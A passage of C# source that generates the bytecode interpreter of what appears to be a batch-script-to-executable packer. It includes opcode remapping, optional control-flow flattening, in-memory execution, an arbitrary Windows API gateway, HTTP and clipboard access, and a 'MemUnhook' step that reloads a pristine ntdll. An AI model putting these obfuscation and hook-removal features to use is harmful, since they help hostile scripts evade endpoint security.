            csBld.AppendLine("                if (inst.Op == 13 || (inst.Op == 6 && inst.A1.ToLowerInvariant() == \"eof\")) break;");
            csBld.AppendLine("                if (inst.Op == 1) { lock (_threadLock) { Console.WriteLine(ExpandVars(inst.A1)); } }");
            csBld.AppendLine("                else if (inst.Op == 3) { lock (_threadLock) { Variables[inst.A1] = ExpandVars(inst.A2); Environment.SetEnvironmentVariable(inst.A1, Variables[inst.A1]); } }");
            csBld.AppendLine("                else if (inst.Op == 4) { long mRes = EvalMath(inst.A2); lock (_threadLock) { Variables[inst.A1] = mRes.ToString(); Environment.SetEnvironmentVariable(inst.A1, mRes.ToString()); } }");
            csBld.AppendLine("                else if (inst.Op == 19) { System.Threading.Thread.Sleep(inst.Iv); }");
            csBld.AppendLine("                else if (inst.Op == 26) { string dll = ExpandVars(inst.A1); string fn = ExpandVars(inst.A2); string args = ExpandVars(inst.A3); WinApiGateway.Invoke(dll, fn, args, Variables); }");
            csBld.AppendLine("                else if (inst.Op == 6) { string tgt = ExpandVars(inst.A1).ToLowerInvariant(); if (labels.ContainsKey(tgt)) { tip = labels[tgt]; continue; } }");
            csBld.AppendLine("                tip++;");
            csBld.AppendLine("            }");
            csBld.AppendLine("        }");
            csBld.AppendLine("");
            csBld.AppendLine("        private static void ExecuteBytecode(byte[] bytecode) {");
            csBld.AppendLine("            List<VmCode> instrs = new List<VmCode>();");
            csBld.AppendLine("            Dictionary<string, int> labels = new Dictionary<string, int>(StringComparer.OrdinalIgnoreCase);");
            csBld.AppendLine("            Dictionary<int, int> stateToIp = new Dictionary<int, int>();");
            csBld.AppendLine("            using (MemoryStream ms = new MemoryStream(bytecode))");
            csBld.AppendLine("            using (BinaryReader br = new BinaryReader(ms, Encoding.UTF8)) {");
            csBld.AppendLine("                byte m1 = br.ReadByte(); byte m2 = br.ReadByte(); byte m3 = br.ReadByte(); byte m4 = br.ReadByte();");
            csBld.AppendLine("                if (m1 != 0x54 || m2 != 0x47 || m3 != 0x5A || m4 != 0x56) return;");
            csBld.AppendLine("                int count = br.ReadInt32();");
            csBld.AppendLine("                for (int i = 0; i < count; i++) {");
            csBld.AppendLine("                    byte mappedOp = br.ReadByte();");
            csBld.AppendLine("                    int rawOp = _opMap.ContainsKey(mappedOp) ? _opMap[mappedOp] : 0;");
            csBld.AppendLine("                    VmCode code = new VmCode();");
            csBld.AppendLine("                    code.Op = rawOp;");
            csBld.AppendLine("                    code.A1 = br.ReadString();");
            csBld.AppendLine("                    code.A2 = br.ReadString();");
            csBld.AppendLine("                    code.A3 = br.ReadString();");
            csBld.AppendLine("                    code.A4 = br.ReadString();");
            csBld.AppendLine("                    code.F1 = br.ReadBoolean();");
            csBld.AppendLine("                    code.F2 = br.ReadBoolean();");
            csBld.AppendLine("                    code.Iv = br.ReadInt32();");
            csBld.AppendLine("                    code.StateId = br.ReadInt32();");
            csBld.AppendLine("                    code.NextStateId = br.ReadInt32();");
            csBld.AppendLine("                    instrs.Add(code);");
            csBld.AppendLine("                    stateToIp[code.StateId] = i;");
            csBld.AppendLine("                    if (rawOp == 7) {");
            csBld.AppendLine("                        labels[code.A1.ToLowerInvariant()] = i;");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                }");
            csBld.AppendLine("            }");
            csBld.AppendLine("");
            csBld.AppendLine("            Stack<int> callStack = new Stack<int>();");
            csBld.AppendLine("            Stack<int[]> tryStack = new Stack<int[]>();");
            csBld.AppendLine("            Stack<string> errVarStack = new Stack<string>();");
            csBld.AppendLine("            int ip = 0;");
            csBld.AppendLine("            int dummyState = 0;");
            csBld.AppendLine("            bool dummyBranch = false;");
            csBld.AppendLine("");
            if (enableCff)
            {
                csBld.AppendLine("            int curState = instrs.Count > 0 ? instrs[0].StateId : 0xDEAD;");
                csBld.AppendLine("            while (curState != 0xDEAD && stateToIp.ContainsKey(curState)) {");
                csBld.AppendLine("                ip = stateToIp[curState];");
            }
            else
            {
                csBld.AppendLine("            while (ip < instrs.Count) {");
            }
            csBld.AppendLine("                VmCode inst = instrs[ip];");
            csBld.AppendLine("                int op = inst.Op;");
            csBld.AppendLine("                string a1 = inst.A1;");
            csBld.AppendLine("                string a2 = inst.A2;");
            csBld.AppendLine("                string a3 = inst.A3;");
            csBld.AppendLine("                string a4 = inst.A4;");
            csBld.AppendLine("                bool f1 = inst.F1;");
            csBld.AppendLine("                bool f2 = inst.F2;");
            csBld.AppendLine("                int iv = inst.Iv;");
            csBld.AppendLine("");
            csBld.AppendLine("                switch (op) {");
            csBld.AppendLine("                    case 1: // Echo");
            csBld.AppendLine("                        Console.WriteLine(ExpandVars(a1));");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 2: // EchoToggle");
            csBld.AppendLine("                        _echoOn = f1;");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 3: // SetVar");
            csBld.AppendLine("                        lock (_threadLock) { Variables[a1] = ExpandVars(a2); Environment.SetEnvironmentVariable(a1, Variables[a1]); }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 4: // SetMath");
            csBld.AppendLine("                        long mathRes = EvalMath(a2);");
            csBld.AppendLine("                        lock (_threadLock) { Variables[a1] = mathRes.ToString(); Environment.SetEnvironmentVariable(a1, mathRes.ToString()); }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 5: // SetPrompt");
            csBld.AppendLine("                        if (!string.IsNullOrEmpty(a2)) Console.Write(ExpandVars(a2));");
            csBld.AppendLine("                        string pInput = Console.ReadLine();");
            csBld.AppendLine("                        lock (_threadLock) { Variables[a1] = pInput ?? \"\"; Environment.SetEnvironmentVariable(a1, Variables[a1]); }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 6: // Goto");
            csBld.AppendLine("                        string target = ExpandVars(a1).ToLowerInvariant();");
            csBld.AppendLine("                        if (target == \"eof\") { return; }");
            if (enableCff)
            {
                csBld.AppendLine("                        if (labels.ContainsKey(target)) { curState = instrs[labels[target]].StateId; continue; }");
            }
            else
            {
                csBld.AppendLine("                        if (labels.ContainsKey(target)) { ip = labels[target]; continue; }");
            }
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 7: // Label");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 8: // IfCmp");
            csBld.AppendLine("                        string left = ExpandVars(a1);");
            csBld.AppendLine("                        string right = ExpandVars(a2);");
            csBld.AppendLine("                        bool match = false;");
            csBld.AppendLine("                        StringComparison sc = f2 ? StringComparison.OrdinalIgnoreCase : StringComparison.Ordinal;");
            csBld.AppendLine("                        if (a4 == \"==\") match = left.Equals(right, sc);");
            csBld.AppendLine("                        else {");
            csBld.AppendLine("                            long lNum = 0, rNum = 0;");
            csBld.AppendLine("                            bool bothNum = long.TryParse(left, out lNum) && long.TryParse(right, out rNum);");
            csBld.AppendLine("                            if (bothNum) {");
            csBld.AppendLine("                                if (a4 == \"EQU\") match = lNum == rNum;");
            csBld.AppendLine("                                else if (a4 == \"NEQ\") match = lNum != rNum;");
            csBld.AppendLine("                                else if (a4 == \"LSS\") match = lNum < rNum;");
            csBld.AppendLine("                                else if (a4 == \"LEQ\") match = lNum <= rNum;");
            csBld.AppendLine("                                else if (a4 == \"GTR\") match = lNum > rNum;");
            csBld.AppendLine("                                else if (a4 == \"GEQ\") match = lNum >= rNum;");
            csBld.AppendLine("                            } else {");
            csBld.AppendLine("                                int cmp = string.Compare(left, right, sc);");
            csBld.AppendLine("                                if (a4 == \"EQU\") match = cmp == 0;");
            csBld.AppendLine("                                else if (a4 == \"NEQ\") match = cmp != 0;");
            csBld.AppendLine("                                else if (a4 == \"LSS\") match = cmp < 0;");
            csBld.AppendLine("                                else if (a4 == \"LEQ\") match = cmp <= 0;");
            csBld.AppendLine("                                else if (a4 == \"GTR\") match = cmp > 0;");
            csBld.AppendLine("                                else if (a4 == \"GEQ\") match = cmp >= 0;");
            csBld.AppendLine("                            }");
            csBld.AppendLine("                        }");
            csBld.AppendLine("                        if (f1) match = !match;");
            if (enableCff)
            {
                csBld.AppendLine("                        if (match) {");
                csBld.AppendLine("                            bool branched = false;");
                csBld.AppendLine("                            ExecuteSubCommand(a3, labels, instrs, ref ip, ref curState, ref branched);");
                csBld.AppendLine("                            if (branched) continue;");
                csBld.AppendLine("                        }");
            }
            else
            {
                csBld.AppendLine("                        if (match) ExecuteSubCommand(a3, labels, ref ip);");
            }
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 9: // IfExist");
            csBld.AppendLine("                        string pExp = ExpandVars(a1);");
            csBld.AppendLine("                        bool ex = File.Exists(pExp) || Directory.Exists(pExp);");
            csBld.AppendLine("                        if (f1) ex = !ex;");
            if (enableCff)
            {
                csBld.AppendLine("                        if (ex) {");
                csBld.AppendLine("                            bool branched = false;");
                csBld.AppendLine("                            ExecuteSubCommand(a2, labels, instrs, ref ip, ref curState, ref branched);");
                csBld.AppendLine("                            if (branched) continue;");
                csBld.AppendLine("                        }");
            }
            else
            {
                csBld.AppendLine("                        if (ex) ExecuteSubCommand(a2, labels, ref ip);");
            }
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 10: // IfDefined");
            csBld.AppendLine("                        string dVar = ExpandVars(a1);");
            csBld.AppendLine("                        bool def = false;");
            csBld.AppendLine("                        lock (_threadLock) { def = Variables.ContainsKey(dVar) || Environment.GetEnvironmentVariable(dVar) != null; }");
            csBld.AppendLine("                        if (f1) def = !def;");
            if (enableCff)
            {
                csBld.AppendLine("                        if (def) {");
                csBld.AppendLine("                            bool branched = false;");
                csBld.AppendLine("                            ExecuteSubCommand(a2, labels, instrs, ref ip, ref curState, ref branched);");
                csBld.AppendLine("                            if (branched) continue;");
                csBld.AppendLine("                        }");
            }
            else
            {
                csBld.AppendLine("                        if (def) ExecuteSubCommand(a2, labels, ref ip);");
            }
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 11: // IfErrorLevel");
            csBld.AppendLine("                        bool elOk = _exitCode >= iv;");
            csBld.AppendLine("                        if (f1) elOk = !elOk;");
            if (enableCff)
            {
                csBld.AppendLine("                        if (elOk) {");
                csBld.AppendLine("                            bool branched = false;");
                csBld.AppendLine("                            ExecuteSubCommand(a2, labels, instrs, ref ip, ref curState, ref branched);");
                csBld.AppendLine("                            if (branched) continue;");
                csBld.AppendLine("                        }");
            }
            else
            {
                csBld.AppendLine("                        if (elOk) ExecuteSubCommand(a2, labels, ref ip);");
            }
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 12: // CallSub");
            csBld.AppendLine("                        string subTarget = ExpandVars(a1).ToLowerInvariant();");
            csBld.AppendLine("                        string subParam = ExpandVars(a2).Trim('\"');");
            csBld.AppendLine("                        if (labels.ContainsKey(subTarget)) {");
            if (enableCff)
            {
                csBld.AppendLine("                            callStack.Push(inst.NextStateId);");
                csBld.AppendLine("                            lock (_threadLock) { Variables[\"1\"] = subParam; }");
                csBld.AppendLine("                            curState = instrs[labels[subTarget]].StateId;");
                csBld.AppendLine("                            continue;");
            }
            else
            {
                csBld.AppendLine("                            callStack.Push(ip + 1);");
                csBld.AppendLine("                            lock (_threadLock) { Variables[\"1\"] = subParam; }");
                csBld.AppendLine("                            ip = labels[subTarget];");
                csBld.AppendLine("                            continue;");
            }
            csBld.AppendLine("                        }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 13: // Return");
            if (enableCff)
            {
                csBld.AppendLine("                        if (callStack.Count > 0) { curState = callStack.Pop(); continue; }");
            }
            else
            {
                csBld.AppendLine("                        if (callStack.Count > 0) { ip = callStack.Pop(); continue; }");
            }
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 14: // Pause");
            csBld.AppendLine("                        try { Console.WriteLine(\"Press any key to continue . . .\"); if (Console.IsInputRedirected) Console.Read(); else Console.ReadKey(true); } catch { }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 15: // Cls");
            csBld.AppendLine("                        try { Console.Clear(); } catch { }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 16: // Title");
            csBld.AppendLine("                        try { Console.Title = ExpandVars(a1); } catch { }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 17: // Color");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 18: // Cd");
            csBld.AppendLine("                        try { Directory.SetCurrentDirectory(ExpandVars(a1)); } catch { }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 19: // Delay");
            csBld.AppendLine("                        System.Threading.Thread.Sleep(iv);");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 20: // ExecDirect (In-Memory Execution)");
            csBld.AppendLine("                        ExecuteDirectProcess(ExpandVars(a1));");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 21: // PipeStream (In-Memory Stdin Stream)");
            csBld.AppendLine("                        ExecutePipeStream(ExpandVars(a1));");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 22: // Exit");
            csBld.AppendLine("                        _exitCode = iv;");
            csBld.AppendLine("                        return;");
            csBld.AppendLine("                    case 23: // ForNumeric");
            csBld.AppendLine("                        string vName = a1;");
            csBld.AppendLine("                        long sVal = EvalMath(a2);");
            csBld.AppendLine("                        long stepVal = EvalMath(a3);");
            csBld.AppendLine("                        string[] a4Parts = (a4 ?? \"\").Split(new[] { '|' }, 2);");
            csBld.AppendLine("                        long eVal = a4Parts.Length > 0 ? EvalMath(a4Parts[0]) : 0;");
            csBld.AppendLine("                        string loopBody = a4Parts.Length > 1 ? a4Parts[1] : \"\";");
            csBld.AppendLine("                        for (long cur = sVal; stepVal >= 0 ? cur <= eVal : cur >= eVal; cur += stepVal) {");
            csBld.AppendLine("                            lock (_threadLock) { Variables[vName] = cur.ToString(); }");
            csBld.AppendLine("                            string expBody = loopBody.Replace(\"%%\" + vName, cur.ToString()).Replace(\"%\" + vName + \"%\", cur.ToString());");
            if (enableCff)
            {
                csBld.AppendLine("                            ExecuteSubCommand(expBody, labels, instrs, ref ip, ref dummyState, ref dummyBranch);");
            }
            else
            {
                csBld.AppendLine("                            ExecuteSubCommand(expBody, labels, ref ip);");
            }
            csBld.AppendLine("                        }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 24: // ForFiles");
            csBld.AppendLine("                        string fVar = a1;");
            csBld.AppendLine("                        string rootDir = ExpandVars(a2);");
            csBld.AppendLine("                        string pattern = ExpandVars(a3);");
            csBld.AppendLine("                        string fileBody = a4;");
            csBld.AppendLine("                        SearchOption opt = f1 ? SearchOption.AllDirectories : SearchOption.TopDirectoryOnly;");
            csBld.AppendLine("                        if (Directory.Exists(rootDir)) {");
            csBld.AppendLine("                            foreach (string fp in Directory.GetFiles(rootDir, pattern, opt)) {");
            csBld.AppendLine("                                lock (_threadLock) { Variables[fVar] = fp; }");
            csBld.AppendLine("                                string expFBody = fileBody.Replace(\"%%\" + fVar, fp).Replace(\"%\" + fVar + \"%\", fp);");
            if (enableCff)
            {
                csBld.AppendLine("                                ExecuteSubCommand(expFBody, labels, instrs, ref ip, ref dummyState, ref dummyBranch);");
            }
            else
            {
                csBld.AppendLine("                                ExecuteSubCommand(expFBody, labels, ref ip);");
            }
            csBld.AppendLine("                            }");
            csBld.AppendLine("                        }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 25: // ForTokens");
            csBld.AppendLine("                        string tVar = a1;");
            csBld.AppendLine("                        string tOpts = a2;");
            csBld.AppendLine("                        string tSource = ExpandVars(a3).Trim('\"');");
            csBld.AppendLine("                        string tokenBody = a4;");
            csBld.AppendLine("                        string delims = \", \\t\";");
            csBld.AppendLine("                        if (tOpts.Contains(\"delims=\")) {");
            csBld.AppendLine("                            int dIdx = tOpts.IndexOf(\"delims=\");");
            csBld.AppendLine("                            delims = tOpts.Substring(dIdx + 7).Split(' ')[0];");
            csBld.AppendLine("                        }");
            csBld.AppendLine("                        string[] tokens = tSource.Split(delims.ToCharArray(), StringSplitOptions.RemoveEmptyEntries);");
            csBld.AppendLine("                        string expTBody = tokenBody;");
            csBld.AppendLine("                        for (int t = 0; t < tokens.Length; t++) {");
            csBld.AppendLine("                            char vChar = tVar.Length > 0 ? tVar[0] : 'a';");
            csBld.AppendLine("                            char currentVarName = (char)(vChar + t);");
            csBld.AppendLine("                            lock (_threadLock) { Variables[currentVarName.ToString()] = tokens[t]; }");
            csBld.AppendLine("                            expTBody = expTBody.Replace(\"%%\" + currentVarName, tokens[t]).Replace(\"%\" + currentVarName + \"%\", tokens[t]);");
            csBld.AppendLine("                        }");
            if (enableCff)
            {
                csBld.AppendLine("                        ExecuteSubCommand(expTBody, labels, instrs, ref ip, ref dummyState, ref dummyBranch);");
            }
            else
            {
                csBld.AppendLine("                        ExecuteSubCommand(expTBody, labels, ref ip);");
            }
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 26: // WinApi (FFI Gateway)");
            csBld.AppendLine("                        string dllName = ExpandVars(a1);");
            csBld.AppendLine("                        string funcName = ExpandVars(a2);");
            csBld.AppendLine("                        string apiArgs = ExpandVars(a3);");
            csBld.AppendLine("                        long apiRes = WinApiGateway.Invoke(dllName, funcName, apiArgs, Variables);");
            csBld.AppendLine("                        lock (_threadLock) { Variables[\"API_RESULT\"] = apiRes.ToString(); Variables[\"WINAPI_RESULT\"] = apiRes.ToString(); Variables[\"ERRORLEVEL\"] = apiRes.ToString(); }");
            csBld.AppendLine("                        _exitCode = (int)apiRes;");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 27: // ThreadStart");
            csBld.AppendLine("                        string tLabel = ExpandVars(a1).ToLowerInvariant();");
            csBld.AppendLine("                        if (labels.ContainsKey(tLabel)) {");
            csBld.AppendLine("                            int targetIp = labels[tLabel];");
            csBld.AppendLine("                            System.Threading.Thread worker = new System.Threading.Thread(() => { ExecuteSubRoutineThread(targetIp, instrs, labels); });");
            csBld.AppendLine("                            worker.IsBackground = true;");
            csBld.AppendLine("                            lock (_threadLock) { _activeThreads.Add(worker); }");
            csBld.AppendLine("                            worker.Start();");
            csBld.AppendLine("                        }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 28: // ThreadWait");
            csBld.AppendLine("                        List<System.Threading.Thread> threadsToWait;");
            csBld.AppendLine("                        lock (_threadLock) { threadsToWait = new List<System.Threading.Thread>(_activeThreads); _activeThreads.Clear(); }");
            csBld.AppendLine("                        foreach (var t in threadsToWait) { if (t != null && t.IsAlive) t.Join(); }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 29: // VfsRead");
            csBld.AppendLine("                        string vFile = ExpandVars(a1);");
            csBld.AppendLine("                        string vDest = ExpandVars(a2);");
            csBld.AppendLine("                        lock (_threadLock) {");
            csBld.AppendLine("                            if (EmbeddedFiles.ContainsKey(vFile)) {");
            csBld.AppendLine("                                try { byte[] bData = Convert.FromBase64String(EmbeddedFiles[vFile]); Variables[vDest] = Encoding.UTF8.GetString(bData); } catch { Variables[vDest] = \"\"; }");
            csBld.AppendLine("                            } else { Variables[vDest] = \"\"; }");
            csBld.AppendLine("                        }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 30: // VfsWrite");
            csBld.AppendLine("                        string vwFile = ExpandVars(a1);");
            csBld.AppendLine("                        string vwContent = ExpandVars(a2);");
            csBld.AppendLine("                        lock (_threadLock) { EmbeddedFiles[vwFile] = Convert.ToBase64String(Encoding.UTF8.GetBytes(vwContent)); }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 31: // HudBanner");
            csBld.AppendLine("                        TigerHud.RenderBanner(ExpandVars(a1), ExpandVars(a2));");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 32: // HudProgress");
            csBld.AppendLine("                        int pNum = 50; int.TryParse(ExpandVars(a1), out pNum);");
            csBld.AppendLine("                        TigerHud.RenderProgress(pNum, ExpandVars(a2));");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 33: // HudMatrix");
            csBld.AppendLine("                        TigerHud.RenderMatrix(iv > 0 ? iv : 25);");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 34: // MemUnhook");
            csBld.AppendLine("                        TigerArmor.ReloadPristineNtdll();");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 35: // GUIMsgBox");
            csBld.AppendLine("                        string mbTitle = ExpandVars(a1); string mbBody = ExpandVars(a2); string mbOpts = a3; string mbResVar = a4;");
            csBld.AppendLine("                        string mbRes = TigerGui.ShowMsgBox(mbTitle, mbBody, mbOpts);");
            csBld.AppendLine("                        lock (_threadLock) { Variables[mbResVar] = mbRes; Variables[\"MSGBOX_RESULT\"] = mbRes; Environment.SetEnvironmentVariable(mbResVar, mbRes); }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 36: // GUIInputBox");
            csBld.AppendLine("                        string ibVar = a1; string ibPrompt = ExpandVars(a2); string ibDefault = ExpandVars(a3); string ibTitle = ExpandVars(a4);");
            csBld.AppendLine("                        string ibRes = TigerGui.ShowInputBox(ibPrompt, ibDefault, ibTitle);");
            csBld.AppendLine("                        lock (_threadLock) { Variables[ibVar] = ibRes; Variables[\"INPUT_RESULT\"] = ibRes; Environment.SetEnvironmentVariable(ibVar, ibRes); }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 37: // GUIFileDialog");
            csBld.AppendLine("                        string fdVar = a1; string fdTitle = ExpandVars(a2); string fdFilter = a3; string fdMode = a4;");
            csBld.AppendLine("                        string fdRes = TigerGui.ShowFileDialog(fdTitle, fdFilter, fdMode);");
            csBld.AppendLine("                        lock (_threadLock) { Variables[fdVar] = fdRes; Variables[\"FILE_RESULT\"] = fdRes; Environment.SetEnvironmentVariable(fdVar, fdRes); }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 38: // HttpGet");
            csBld.AppendLine("                        string hgVar = a1; string hgUrl = ExpandVars(a2); int hgTimeout = iv > 0 ? iv : 10000;");
            csBld.AppendLine("                        string hgRes = TigerHttp.Get(hgUrl, hgTimeout);");
            csBld.AppendLine("                        lock (_threadLock) { Variables[hgVar] = hgRes; Variables[\"HTTP_RESPONSE\"] = hgRes; Environment.SetEnvironmentVariable(hgVar, hgRes); }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 39: // HttpPost");
            csBld.AppendLine("                        string hpVar = a1; string hpUrl = ExpandVars(a2); string hpPayload = ExpandVars(a3); string hpType = ExpandVars(a4); int hpTimeout = iv > 0 ? iv : 10000;");
            csBld.AppendLine("                        string hpRes = TigerHttp.Post(hpUrl, hpPayload, hpType, hpTimeout);");
            csBld.AppendLine("                        lock (_threadLock) { Variables[hpVar] = hpRes; Variables[\"HTTP_RESPONSE\"] = hpRes; Environment.SetEnvironmentVariable(hpVar, hpRes); }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 40: // Notify Toast");
            csBld.AppendLine("                        string ntTitle = ExpandVars(a1); string ntMsg = ExpandVars(a2); string ntIcon = a3; int ntSec = iv > 0 ? iv : 5;");
            csBld.AppendLine("                        TigerNotify.ShowToast(ntTitle, ntMsg, ntSec, ntIcon);");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 41: // JsonGet");
            csBld.AppendLine("                        string jgVar = a1; string jgSrc = ExpandVars(a2);");
            csBld.AppendLine("                        lock (_threadLock) { if (Variables.ContainsKey(a2)) jgSrc = Variables[a2]; }");
            csBld.AppendLine("                        string jgPath = ExpandVars(a3);");
            csBld.AppendLine("                        string jgVal = TigerData.JsonGet(jgSrc, jgPath);");
            csBld.AppendLine("                        lock (_threadLock) { Variables[jgVar] = jgVal; Variables[\"JSON_RESULT\"] = jgVal; Environment.SetEnvironmentVariable(jgVar, jgVal); }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 42: // JsonSet");
            csBld.AppendLine("                        string jsDestVar = a1; string jsSrcJson = ExpandVars(a2);");
            csBld.AppendLine("                        lock (_threadLock) { if (Variables.ContainsKey(a2)) jsSrcJson = Variables[a2]; }");
            csBld.AppendLine("                        string jsPath = ExpandVars(a3); string jsVal = ExpandVars(a4);");
            csBld.AppendLine("                        string jsNewJson = TigerData.JsonSet(jsSrcJson, jsPath, jsVal);");
            csBld.AppendLine("                        lock (_threadLock) { Variables[jsDestVar] = jsNewJson; Variables[\"JSON_RESULT\"] = jsNewJson; Environment.SetEnvironmentVariable(jsDestVar, jsNewJson); }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 43: // SqlExec");
            csBld.AppendLine("                        TigerData.SqlExec(ExpandVars(a1));");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 44: // SqlQuery");
            csBld.AppendLine("                        string sqVar = a1; string sqQuery = ExpandVars(a2);");
            csBld.AppendLine("                        string sqRes = TigerData.SqlQuery(sqQuery);");
            csBld.AppendLine("                        lock (_threadLock) { Variables[sqVar] = sqRes; Variables[\"SQL_RESULT\"] = sqRes; Environment.SetEnvironmentVariable(sqVar, sqRes); }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 45: // ClipGet");
            csBld.AppendLine("                        string cgVar = a1; string cgText = TigerData.ClipGet();");
            csBld.AppendLine("                        lock (_threadLock) { Variables[cgVar] = cgText; Variables[\"CLIP_RESULT\"] = cgText; Environment.SetEnvironmentVariable(cgVar, cgText); }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 46: // ClipSet");
            csBld.AppendLine("                        TigerData.ClipSet(ExpandVars(a1));");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 47: // Crypto AES");
            csBld.AppendLine("                        string crVar = a1; string crData = ExpandVars(a2);");
            csBld.AppendLine("                        lock (_threadLock) { if (Variables.ContainsKey(a2)) crData = Variables[a2]; }");
            csBld.AppendLine("                        string crPass = ExpandVars(a3);");
            csBld.AppendLine("                        string crRes = (a4 == \"DEC\") ? TigerCrypto.AesDecrypt(crData, crPass) : TigerCrypto.AesEncrypt(crData, crPass);");
            csBld.AppendLine("                        lock (_threadLock) { Variables[crVar] = crRes; Variables[\"CRYPTO_RESULT\"] = crRes; Environment.SetEnvironmentVariable(crVar, crRes); }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 48: // Crypto Hash / Base64");
            csBld.AppendLine("                        string chVar = a1; string chData = ExpandVars(a2);");
            csBld.AppendLine("                        lock (_threadLock) { if (Variables.ContainsKey(a2)) chData = Variables[a2]; }");
            csBld.AppendLine("                        string chMode = a3; string chRes = \"\";");
            csBld.AppendLine("                        if (chMode == \"SHA256\") chRes = TigerCrypto.ComputeSha256(chData);");
            csBld.AppendLine("                        else if (chMode == \"MD5\") chRes = TigerCrypto.ComputeMd5(chData);");
            csBld.AppendLine("                        else if (chMode == \"B64_ENC\") chRes = TigerCrypto.Base64Encode(chData);");
            csBld.AppendLine("                        else if (chMode == \"B64_DEC\") chRes = TigerCrypto.Base64Decode(chData);");
            csBld.AppendLine("                        lock (_threadLock) { Variables[chVar] = chRes; Variables[\"HASH_RESULT\"] = chRes; Environment.SetEnvironmentVariable(chVar, chRes); }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 49: // TryStart");
            csBld.AppendLine("                        int catchIp = -1; int endTryIp = -1;");
            csBld.AppendLine("                        for (int searchIp = ip + 1; searchIp < instrs.Count; searchIp++) {");
            csBld.AppendLine("                            if (instrs[searchIp].Op == 50 && catchIp == -1) catchIp = searchIp;");
            csBld.AppendLine("                            if (instrs[searchIp].Op == 51 && endTryIp == -1) { endTryIp = searchIp; break; }");
            csBld.AppendLine("                        }");
            csBld.AppendLine("                        string errVar = !string.IsNullOrEmpty(a1) ? a1 : \"ERROR_MSG\";");
            csBld.AppendLine("                        tryStack.Push(new int[] { catchIp, endTryIp, catchIp != -1 ? instrs[catchIp].StateId : 0, endTryIp != -1 ? instrs[endTryIp].StateId : 0 });");
            csBld.AppendLine("                        errVarStack.Push(errVar);");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 50: // Catch");
            csBld.AppendLine("                        if (tryStack.Count > 0) {");
            csBld.AppendLine("                            int[] frame = tryStack.Pop();");
            csBld.AppendLine("                            errVarStack.Pop();");
            if (enableCff) csBld.AppendLine("                            curState = frame[3]; continue;");
            else csBld.AppendLine("                            ip = frame[1]; continue;");
            csBld.AppendLine("                        }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 51: // EndTry");
            csBld.AppendLine("                        if (tryStack.Count > 0) { tryStack.Pop(); errVarStack.Pop(); }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 52: // HudTable");
            csBld.AppendLine("                        TigerHud.RenderTable(ExpandVars(a1));");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 53: // HudSpinner");
            csBld.AppendLine("                        int sMs = 1000; int.TryParse(ExpandVars(a1), out sMs);");
            csBld.AppendLine("                        TigerHud.RenderSpinner(sMs > 0 ? sMs : 1000, ExpandVars(a2));");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 54: // VfsList");
            csBld.AppendLine("                        string vlDest = a1;");
            csBld.AppendLine("                        lock (_threadLock) {");
            csBld.AppendLine("                            string[] keys = new string[EmbeddedFiles.Keys.Count];");
            csBld.AppendLine("                            EmbeddedFiles.Keys.CopyTo(keys, 0);");
            csBld.AppendLine("                            string vfsListStr = string.Join(\", \", keys);");
            csBld.AppendLine("                            Variables[vlDest] = vfsListStr;");
            csBld.AppendLine("                            Variables[\"VFS_LIST\"] = vfsListStr;");
            csBld.AppendLine("                            Environment.SetEnvironmentVariable(vlDest, vfsListStr);");
            csBld.AppendLine("                        }");
            csBld.AppendLine("                        break;");
            csBld.AppendLine("                    case 55: // RegRead");
